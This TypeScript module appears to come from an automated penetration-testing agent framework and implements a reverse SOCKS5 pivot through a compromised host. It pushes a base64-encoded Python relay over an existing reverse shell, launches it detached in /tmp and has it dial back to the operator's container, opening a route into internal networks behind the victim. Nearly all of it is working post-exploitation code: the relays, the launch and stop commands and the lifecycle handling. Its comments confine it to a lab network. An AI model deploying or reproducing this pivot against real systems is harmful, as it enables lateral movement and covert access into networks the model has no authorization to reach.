/**
 * planning_update.md W-O/H7 (owner decision 2026-11-02, Option A): the managed reverse SOCKS5 pivot.
 *
 * The execution layer's one real competitive gap was multi-host pivoting: p2o could reach the target, but a host behind
 * it was reachable only by hand-building a tunnel inside a raw `exec` call, with no lifecycle and no audit. This module
 * is the other half of the foothold (see `src/foothold.ts`): the foothold keeps ONE reverse shell to an obtained host,
 * and a tunnel turns that host into the sandbox's route into the networks behind it.
 *
 * The trusted anchor is unchanged: all model bytes reach the target only through an already-identified foothold shell,
 * and every byte this module writes to that shell is host-authored fixed text — a fixed Python relay and validated
 * integers. No model string is interpolated, so the tunnel adds no new injection surface.
 *
 * Data path (`tunnel-open port=<loopback socks port>`):
 *   1. the host starts the relay below inside the session container. It binds a SOCKS5 proxy on 127.0.0.1:<port> and a
 *      reverse listener on 0.0.0.0:<ephemeral> (the operator's `--lab-network`; the same path the foothold peer used).
 *   2. the host writes a second, equally fixed relay onto the obtained host through the foothold shell and starts it.
 *      That relay dials back to the session container and serves, per reverse connection, one destination a SOCKS5 client
 *      asked for. Nothing on the obtained host listens on an inbound port.
 *   3. a command inside the session can now reach hosts behind the obtained host through that proxy — for example
 *      `curl --socks5-hostname 127.0.0.1:<port> http://<internal-host>:<port>/`.
 *
 * The published facts stay the ones this codebase already keeps: one tunnel per session, opened and closed explicitly,
 * each transition recorded as a session lifecycle line by the extension; the relays die with the session container; no
 * host port is published and no external ingress exists. A destination that fails is a gap, never a clean result.
 */

/** The tunnel lifecycle, mirrored by the `p2o_session` action whitelist and the broker's forwarding list. */
export const TUNNEL_ACTIONS = ['tunnel-open', 'tunnel-list', 'tunnel-close'] as const;
export type TunnelAction = typeof TUNNEL_ACTIONS[number];
export const isTunnelAction = (value: string): value is TunnelAction => (TUNNEL_ACTIONS as readonly string[]).includes(value);

/** One tunnel per session: the session's foothold already owns the single peer connection, so a second pivot has no path. */
export const TUNNEL_MAX_PER_SESSION = 1;
/** How many reverse connections the obtained host keeps dialled back; one SOCKS5 request consumes one at a time. */
export const TUNNEL_TARGET_WORKERS = 4;
/** The copy of the relay on the obtained host must travel the foothold's own command bound, so keep it small. */
export const TUNNEL_RELAY_BYTES = 16 * 1024;

export interface TunnelExec { code: number; stdout: string; stderr: string }
export interface TunnelTransport {
  /** One host-authored command in the session container; the extension routes it through the session executor. */
  exec(command: string, seconds?: number): Promise<TunnelExec>;
  /** One host-authored line through the identified foothold shell; the extension owns that gate. */
  send(text: string): Promise<{ bytes: number }>;
}
export interface TunnelOptions {
  /** The session container name a lab-network peer resolves; the target dials `<container>:<relayPort>`. */
  container?: string;
  /** The foothold transcript path inside the session container, where the obtained host's shell output lands. */
  footholdLog: string;
  /** Injectable clock/sleep and deadlines so the state machine is testable without waiting. */
  now?: () => number;
  sleep?: (ms: number) => Promise<void>;
  readyMs?: number;
  dialMs?: number;
  closeMs?: number;
  /** Test seam only; the extension lets the module generate one per tunnel. */
  token?: string;
}
export interface TunnelState {
  port: number;
  relayPort: number;
  socks: string;
  address: string;
  log: string;
  pidFile: string;
  script: string;
  relayFile: string;
  token: string;
  targetScript: string;
  targetLog: string;
  targetPidFile: string;
  openedAt: string;
  targetStopped?: boolean;
}
export interface TunnelClose { port: number; socks: string; address: string; verified: boolean; targetStopped: boolean; log: string }

export function tunnelPaths(port: number) {
  const base = `tunnels/tunnel-${port}`;
  return { script: `${base}.py`, log: `${base}.log`, pidFile: `${base}.pid`, relayFile: `${base}.relay`, base };
}

const targetBase = (token: string) => `/tmp/p2o-tunnel-${token}`;
export const tunnelMarker = (token: string, name: string) => `P2O_TUNNEL_${token}_${name}`;

/**
 * The relay in the session container. Host-authored, fixed bytes; argv is validated integers and one host-written path.
 * It binds the loopback SOCKS5 endpoint and the lab-network reverse listener, writes the chosen relay port to a file (the
 * port is chosen by the kernel, so the host does not have to reserve a second guess), and pairs each reverse connection
 * with the next SOCKS5 request. A pooled connection the obtained host has already dropped is discarded before pairing.
 */
export const TUNNEL_SOCKS_SCRIPT = [
  'import select, socket, sys, threading',
  'socks_port = int(sys.argv[1])',
  'relay_port = int(sys.argv[2])',
  'port_file = sys.argv[3]',
  'idle = []',
  'lock = threading.Condition()',
  'def say(line):',
  '    sys.stdout.write("[p2o] %s%s" % (line, chr(10)))',
  '    sys.stdout.flush()',
  'def read_exact(conn, size):',
  '    data = b""',
  '    while len(data) < size:',
  '        chunk = conn.recv(size - len(data))',
  '        if not chunk:',
  '            raise OSError("closed")',
  '        data += chunk',
  '    return data',
  'def healthy(conn):',
  '    try:',
  '        readable, _, _ = select.select([conn], [], [], 0)',
  '        if not readable:',
  '            return True',
  '        return conn.recv(1, socket.MSG_PEEK) != b""',
  '    except OSError:',
  '        return False',
  'def take(timeout):',
  '    with lock:',
  '        while True:',
  '            while idle and not healthy(idle[0]):',
  '                try:',
  '                    idle.pop(0).close()',
  '                except OSError:',
  '                    pass',
  '            if idle:',
  '                return idle.pop(0)',
  '            if not lock.wait(timeout):',
  '                return None',
  'def pipe(left, right):',
  '    def forward(src, dst):',
  '        try:',
  '            while True:',
  '                data = src.recv(65536)',
  '                if not data:',
  '                    break',
  '                dst.sendall(data)',
  '        except OSError:',
  '            pass',
  '        try:',
  '            dst.shutdown(socket.SHUT_WR)',
  '        except OSError:',
  '            pass',
  '    thread = threading.Thread(target=forward, args=(left, right), daemon=True)',
  '    thread.start()',
  '    forward(right, left)',
  '    thread.join(30)',
  'def serve(client):',
  '    conn = None',
  '    try:',
  '        client.settimeout(30)',
  '        version, count = read_exact(client, 2)',
  '        if version != 5:',
  '            return',
  '        read_exact(client, count)',
  '        client.sendall(bytes((5, 0)))',
  '        version, command, _, address_type = read_exact(client, 4)',
  '        if version != 5 or command != 1:',
  '            client.sendall(bytes((5, 7, 0, 1)) + bytes(6))',
  '            return',
  '        if address_type == 1:',
  '            host = socket.inet_ntoa(read_exact(client, 4))',
  '        elif address_type == 3:',
  '            host = read_exact(client, read_exact(client, 1)[0]).decode("utf-8", "replace")',
  '        elif address_type == 4:',
  '            host = socket.inet_ntop(socket.AF_INET6, read_exact(client, 16))',
  '        else:',
  '            client.sendall(bytes((5, 8, 0, 1)) + bytes(6))',
  '            return',
  '        port = int.from_bytes(read_exact(client, 2), "big")',
  '        destination = ("%s %d%s" % (host, port, chr(10))).encode()',
  '        reply = None',
  '        for attempt in range(8):',
  '            conn = take(5)',
  '            if conn is None:',
  '                client.sendall(bytes((5, 1, 0, 1)) + bytes(6))',
  '                return',
  '            try:',
  '                conn.settimeout(10)',
  '                conn.sendall(destination)',
  '                status = b""',
  '                while not status.endswith(b"\\n") and len(status) < 256:',
  '                    chunk = conn.recv(256 - len(status))',
  '                    if not chunk:',
  '                        break',
  '                    status += chunk',
  '                if status.startswith(b"OK"):',
  '                    reply = bytes((5, 0, 0, 1)) + bytes(6)',
  '                    break',
  '                conn.close()',
  '                conn = None',
  '            except OSError:',
  '                try:',
  '                    conn.close()',
  '                except OSError:',
  '                    pass',
  '                conn = None',
  '        if reply is None:',
  '            client.sendall(bytes((5, 5, 0, 1)) + bytes(6))',
  '            return',
  '        conn.settimeout(None)',
  '        client.settimeout(None)',
  '        client.sendall(reply)',
  '        pipe(client, conn)',
  '    except OSError:',
  '        pass',
  '    finally:',
  '        try:',
  '            client.close()',
  '        except OSError:',
  '            pass',
  '        if conn is not None:',
  '            try:',
  '                conn.close()',
  '            except OSError:',
  '                pass',
  'def reverse_listener():',
  '    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
  '    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)',
  '    server.bind(("0.0.0.0", relay_port))',
  '    chosen = server.getsockname()[1]',
  '    with open(port_file, "w") as marker:',
  '        marker.write(str(chosen))',
  '    server.listen(16)',
  '    say("relay listening on 0.0.0.0:%d" % chosen)',
  '    while True:',
  '        try:',
  '            connection, peer = server.accept()',
  '        except OSError:',
  '            break',
  '        say("target relay connected")',
  '        try:',
  '            connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)',
  '        except OSError:',
  '            pass',
  '        with lock:',
  '            idle.append(connection)',
  '            lock.notify()',
  'threading.Thread(target=reverse_listener, daemon=True).start()',
  'server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
  'server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)',
  'server.bind(("127.0.0.1", socks_port))',
  'server.listen(64)',
  'say("socks5 listening on 127.0.0.1:%d" % socks_port)',
  'while True:',
  '    connection, _ = server.accept()',
  '    threading.Thread(target=serve, args=(connection,), daemon=True).start()',
].join('\n');

/**
 * The relay copied to the obtained host. Fixed bytes, validated argv (relay host/port), no inbound listen: it keeps a
 * few connections dialled back to the session container and, per connection, connects the destination a SOCKS5 client
 * named and splices the bytes. When the pivot is closed the listener is gone, so it gives up after two minutes of
 * failed dial-outs instead of retrying forever.
 */
export const TUNNEL_TARGET_SCRIPT = [
  'import socket, sys, threading, time',
  'relay_host, relay_port = sys.argv[1], int(sys.argv[2])',
  'idle_timeout = 300',
  'stopped = threading.Event()',
  'def pipe(left, right):',
  '    def forward(src, dst):',
  '        try:',
  '            while True:',
  '                data = src.recv(65536)',
  '                if not data:',
  '                    break',
  '                dst.sendall(data)',
  '        except OSError:',
  '            pass',
  '        try:',
  '            dst.shutdown(socket.SHUT_WR)',
  '        except OSError:',
  '            pass',
  '    thread = threading.Thread(target=forward, args=(left, right), daemon=True)',
  '    thread.start()',
  '    forward(right, left)',
  '    thread.join(30)',
  'def read_line(conn, limit=1024):',
  '    data = b""',
  '    while not data.endswith(b"\\n") and len(data) < limit:',
  '        chunk = conn.recv(limit - len(data))',
  '        if not chunk:',
  '            return None',
  '        data += chunk',
  '    return data.decode("utf-8", "replace").strip()',
  'def worker():',
  '    failures = 0',
  '    while not stopped.is_set():',
  '        try:',
  '            relay = socket.create_connection((relay_host, relay_port), 5)',
  '        except OSError:',
  '            failures += 1',
  '            if failures >= 120:',
  '                return',
  '            time.sleep(1)',
  '            continue',
  '        failures = 0',
  '        try:',
  '            relay.settimeout(idle_timeout)',
  '            header = read_line(relay)',
  '            if not header:',
  '                continue',
  '            parts = header.split()',
  '            if len(parts) != 2:',
  '                relay.sendall(b"ERR\\n")',
  '                continue',
  '            destination, port = parts[0], int(parts[1])',
  '            try:',
  '                upstream = socket.create_connection((destination, port), 8)',
  '            except OSError:',
  '                relay.sendall(b"ERR\\n")',
  '                continue',
  '            relay.sendall(b"OK\\n")',
  '            relay.settimeout(None)',
  '            pipe(relay, upstream)',
  '            try:',
  '                upstream.close()',
  '            except OSError:',
  '                pass',
  '        except (OSError, ValueError):',
  '            pass',
  '        finally:',
  '            try:',
  '                relay.close()',
  '            except OSError:',
  '                pass',
  'for _ in range(4):',
  '    threading.Thread(target=worker, daemon=True).start()',
  'while True:',
  '    time.sleep(60)',
].join('\n');

/** The one line the foothold shell receives: decode the fixed relay into a temp file, start it detached, remember its pid. */
export function targetTunnelCommand(input: { token: string; relayHost: string; relayPort: number }): { command: string; bytes: number } {
  const base = targetBase(input.token);
  const encoded = Buffer.from(TUNNEL_TARGET_SCRIPT, 'utf8').toString('base64');
  const command = [
    `python3 -c "import base64,pathlib;pathlib.Path('${base}.py').write_bytes(base64.b64decode('${encoded}'))" 2>/dev/null || echo ${tunnelMarker(input.token, 'NO_PY')}`,
    `nohup python3 ${base}.py ${input.relayHost} ${input.relayPort} >${base}.log 2>&1 &`,
    `echo $! >${base}.pid`,
  ].join('\n');
  return { command, bytes: Buffer.byteLength(command) };
}

/** Kill the obtained host's relay and print a marker the host can find in the foothold transcript; the marker is proof of the stop, not the kill. */
export function tunnelStopCommand(token: string): string {
  const base = targetBase(token);
  return [
    `kill "$(cat ${base}.pid)" 2>/dev/null`,
    `rm -f ${base}.pid ${base}.py`,
    `echo ${tunnelMarker(token, 'STOPPED')}`,
  ].join('\n');
}

/** Kill the session-container relay and verify both the process death and the control-file removal, like the foothold close. */
const killCommand = (pid: string) => [
  `kill ${pid} 2>/dev/null; i=0`,
  `while [ $i -lt 20 ]; do kill -0 ${pid} 2>/dev/null || break; i=$((i+1)); sleep 0.1; done`,
  `if kill -0 ${pid} 2>/dev/null; then kill -9 ${pid} 2>/dev/null; sleep 0.2; fi`,
  `if kill -0 ${pid} 2>/dev/null; then exit 1; fi`,
  'exit 0',
].join('\n');

export class TunnelError extends Error {
  constructor(readonly code: string, message: string) { super(`${code}: ${message}`); this.name = 'TunnelError'; }
}

const tail = (text: string) => text.trim().split('\n').slice(-1)[0]?.slice(-400) ?? 'no output';

export class Tunnel {
  private current?: TunnelState;
  private closed = true;
  private readonly container?: string;
  private readonly footholdLog: string;
  private readonly now: () => number;
  private readonly sleep: (ms: number) => Promise<void>;
  private readonly readyMs: number;
  private readonly dialMs: number;
  private readonly closeMs: number;
  private readonly token: string;
  constructor(private readonly transport: TunnelTransport, options: TunnelOptions) {
    this.container = options.container;
    this.footholdLog = options.footholdLog;
    this.now = options.now ?? (() => Date.now());
    this.sleep = options.sleep ?? (ms => new Promise(resolve => setTimeout(resolve, ms)));
    this.readyMs = options.readyMs ?? 10_000;
    this.dialMs = options.dialMs ?? 20_000;
    this.closeMs = options.closeMs ?? 10_000;
    this.token = options.token ?? `w${Math.random().toString(16).slice(2, 10)}`;
    if (!/^[a-z0-9]{8,32}$/.test(this.token)) throw new TunnelError('TUNNEL_TOKEN', 'a tunnel token is 8..32 lowercase hex characters');
  }
  get isOpen(): boolean { return this.current !== undefined && !this.closed; }
  /** A copy: a caller cannot mutate the recorded paths through the state reader. */
  state(): TunnelState | undefined { return this.current ? { ...this.current } : undefined; }

  /** Point the loopback SOCKS5 proxy at `port`, start the obtained host's relay through the foothold, and verify the dial-back. */
  async open(port: number): Promise<TunnelState> {
    if (!Number.isInteger(port) || port < 1 || port > 65535) throw new TunnelError('TUNNEL_INVALID_PORT', 'a tunnel port is an integer 1..65535');
    if (this.current && !this.closed) throw new TunnelError('TUNNEL_EXISTS', `a tunnel is already open on 127.0.0.1:${this.current.port}; one pivot per session, close it before opening another`);
    const paths = tunnelPaths(port);
    const start = [
      'mkdir -p tunnels',
      `rm -f ${paths.log} ${paths.pidFile} ${paths.relayFile} ${paths.script}`,
      `cat > ${paths.script} <<'P2O_TUNNEL'`,
      TUNNEL_SOCKS_SCRIPT,
      'P2O_TUNNEL',
      `nohup sh -c 'echo $$ > ${paths.pidFile}; exec /usr/bin/python3 -I -S ${paths.script} ${port} 0 ${paths.relayFile}' > ${paths.log} 2>&1 &`,
      'sleep 0.2',
    ].join('\n');
    const started = await this.transport.exec(start, 30);
    if (started.code !== 0) throw new TunnelError('TUNNEL_START_FAILED', `could not start the session relay (exit ${started.code}): ${tail(started.stderr || started.stdout)}`);
    const relayPort = await this.awaitRelay(port, paths);
    // A TCP connect proves the loopback proxy accepted a client before the obtained host is involved; the SOCKS5
    // handshake itself is exercised end to end by the tunnel tests.
    const probe = await this.transport.exec(`/usr/bin/python3 -I -S -c 'import socket,sys; socket.create_connection(("127.0.0.1", int(sys.argv[1])), 1).close()' ${port}`, 15).catch(() => undefined);
    if (probe && probe.code !== 0) {
      await this.stopSessionRelay(port, paths, relayPort).catch(() => undefined);
      throw new TunnelError('TUNNEL_UNHEALTHY', `the loopback SOCKS5 proxy did not accept a local connection; the relay was stopped and no tunnel is recorded`);
    }
    const address = this.container ? `${this.container}:${relayPort}` : `0.0.0.0:${relayPort}`;
    const pushed = targetTunnelCommand({ token: this.token, relayHost: this.container ?? '127.0.0.1', relayPort });
    if (pushed.bytes > TUNNEL_RELAY_BYTES) {
      await this.stopSessionRelay(port, paths, relayPort).catch(() => undefined);
      throw new TunnelError('TUNNEL_RELAY_TOO_LARGE', `the obtained host's relay needs a ${pushed.bytes}-byte command, above this module's ${TUNNEL_RELAY_BYTES}-byte budget`);
    }
    try { await this.transport.send(pushed.command); }
    catch (error) {
      await this.stopSessionRelay(port, paths, relayPort).catch(() => undefined);
      throw new TunnelError('TUNNEL_TARGET_START_FAILED', `the foothold shell did not accept the relay start line: ${error instanceof Error ? error.message : String(error)}`);
    }
    const dial = await this.awaitDialBack(paths);
    if (dial === 'no-python') {
      await this.stopSessionRelay(port, paths, relayPort).catch(() => undefined);
      throw new TunnelError('TUNNEL_TARGET_START_REFUSED', 'the obtained host could not write and start the relay: it needs `python3` on PATH and a writable /tmp (or the shell could not run either). Install one or relay through a different host; no tunnel is recorded');
    }
    if (dial !== 'connected') {
      const log = await this.transport.exec(`tail -c 8192 ${paths.log} 2>/dev/null`, 10).catch(() => undefined);
      const transcript = await this.transport.exec(`tail -c 2048 ${this.footholdLog} 2>/dev/null`, 10).catch(() => undefined);
      await this.transport.send(tunnelStopCommand(this.token)).catch(() => undefined);
      await this.stopSessionRelay(port, paths, relayPort).catch(() => undefined);
      throw new TunnelError('TUNNEL_UNHEALTHY', `the obtained host's relay did not dial back to ${address} within ${Math.round(this.dialMs / 1000)}s. The host must resolve the session container on the lab network (it reached the foothold at the same address family) and keep outbound access; no tunnel is recorded.${log?.stdout?.trim() ? ` (relay log: ${tail(log.stdout)})` : ''}${transcript?.stdout?.trim() ? ` (foothold tail: ${tail(transcript.stdout)})` : ''}`);
    }
    this.current = { port, relayPort, socks: `127.0.0.1:${port}`, address, log: paths.log, pidFile: paths.pidFile, script: paths.script, relayFile: paths.relayFile,
      token: this.token, targetScript: `${targetBase(this.token)}.py`, targetLog: `${targetBase(this.token)}.log`, targetPidFile: `${targetBase(this.token)}.pid`, openedAt: new Date(this.now()).toISOString() };
    this.closed = false;
    return this.state()!;
  }

  /** Stop both relays: the obtained host's first, then the session container's, and verify what can be verified. */
  async close(): Promise<TunnelClose> {
    const current = this.requireOpen();
    await this.transport.send(tunnelStopCommand(this.token)).catch(() => undefined);
    const stopped = await this.awaitMarker(tunnelMarker(this.token, 'STOPPED'), Math.round(this.closeMs / 1000));
    current.targetStopped = stopped;
    const paths = tunnelPaths(current.port);
    const verified = await this.stopSessionRelay(current.port, paths, current.relayPort);
    // An unverified session-side stop leaves a live local proxy, so nothing is claimed closed: the caller may retry.
    if (!verified) throw new TunnelError('TUNNEL_CLOSE_UNVERIFIED', 'the session relay did not stop, or its control files are still present; nothing is claimed closed. Closing the session container is the only other removal guarantee');
    this.closed = true;
    return { port: current.port, socks: current.socks, address: current.address, verified, targetStopped: stopped, log: current.log };
  }

  /** Poll for the relay's port file and listening marker, then read the kernel-chosen relay port. */
  private async awaitRelay(port: number, paths: ReturnType<typeof tunnelPaths>): Promise<number> {
    const attempts = Math.max(1, Math.ceil(this.readyMs / 300));
    const probe = [
      'i=0',
      `while [ $i -lt ${attempts} ]; do`,
      `  relay=$(cat ${paths.relayFile} 2>/dev/null)`,
      `  if [ -n "$relay" ] && kill -0 "$(cat ${paths.pidFile})" 2>/dev/null && grep -q 'socks5 listening on 127.0.0.1:${port}' ${paths.log} 2>/dev/null; then echo "$relay"; exit 0; fi`,
      '  i=$((i+1)); sleep 0.3',
      'done; exit 1',
    ].join('\n');
    const result = await this.transport.exec(probe, Math.ceil(this.readyMs / 1000) + 10);
    const relayPort = Number(result.stdout.trim());
    if (result.code !== 0 || !Number.isInteger(relayPort) || relayPort < 1 || relayPort > 65535) {
      const log = await this.transport.exec(`tail -c 8192 ${paths.log} 2>/dev/null`, 10).catch(() => undefined);
      await this.transport.exec(`kill "$(cat ${paths.pidFile} 2>/dev/null)" 2>/dev/null; rm -f ${paths.pidFile} ${paths.relayFile} ${paths.script}`, 10).catch(() => undefined);
      throw new TunnelError('TUNNEL_UNHEALTHY', `the session relay did not report a listening SOCKS5 proxy and reverse listener${log?.stdout?.trim() ? ` (log: ${tail(log.stdout)})` : ''}; no tunnel is recorded`);
    }
    return relayPort;
  }

  /** Wait until the obtained host's relay dials the reverse listener, or until its shell reported that python3 is missing. */
  private async awaitDialBack(paths: ReturnType<typeof tunnelPaths>): Promise<'connected' | 'no-python' | 'timeout'> {
    const attempts = Math.max(1, Math.ceil(this.dialMs / 500));
    const marker = tunnelMarker(this.token, 'NO_PY');
    const probe = [
      'i=0',
      `while [ $i -lt ${attempts} ]; do`,
      `  if grep -q '${marker}' ${this.footholdLog} 2>/dev/null; then echo no-python; exit 2; fi`,
      `  if grep -q 'target relay connected' ${paths.log} 2>/dev/null; then echo connected; exit 0; fi`,
      '  i=$((i+1)); sleep 0.5',
      'done; exit 1',
    ].join('\n');
    const result = await this.transport.exec(probe, Math.ceil(this.dialMs / 1000) + 10);
    return result.code === 0 ? 'connected' : result.code === 2 ? 'no-python' : 'timeout';
  }

  /** Poll the foothold transcript for a marker the obtained host printed (its shell output lands there, not in the tunnel log). */
  private async awaitMarker(marker: string, seconds: number): Promise<boolean> {
    const attempts = Math.max(1, Math.ceil((seconds * 1000) / 400));
    const probe = [
      'i=0',
      `while [ $i -lt ${attempts} ]; do`,
      `  if grep -q '${marker}' ${this.footholdLog} 2>/dev/null; then exit 0; fi`,
      '  i=$((i+1)); sleep 0.4',
      'done; exit 1',
    ].join('\n');
    const result = await this.transport.exec(probe, seconds + 5).catch(() => undefined);
    return result?.code === 0;
  }

  /** Kill the session-container relay and verify process death plus control-file removal; never claims more than it checked. */
  private async stopSessionRelay(port: number, paths: ReturnType<typeof tunnelPaths>, relayPort: number): Promise<boolean> {
    const pid = await this.transport.exec(`cat ${paths.pidFile} 2>/dev/null`, 10).catch(() => undefined);
    const parsed = pid && pid.code === 0 ? pid.stdout.trim() : '';
    try {
      if (/^[0-9]{1,10}$/.test(parsed)) {
        const killed = await this.transport.exec(killCommand(parsed), 15);
        if (killed.code !== 0) return false;
      }
      const removed = await this.transport.exec(`rm -f ${paths.pidFile} ${paths.relayFile}; test ! -e ${paths.pidFile} && test ! -e ${paths.relayFile}`, 10);
      return removed.code === 0;
    } catch { return false; }
  }

  private requireOpen(): TunnelState {
    if (!this.current || this.closed) throw new TunnelError('TUNNEL_NOT_OPEN', 'this tunnel is not open; start one with p2o_session action=tunnel-open port=<port> after the foothold identity is confirmed');
    return this.current;
  }
}
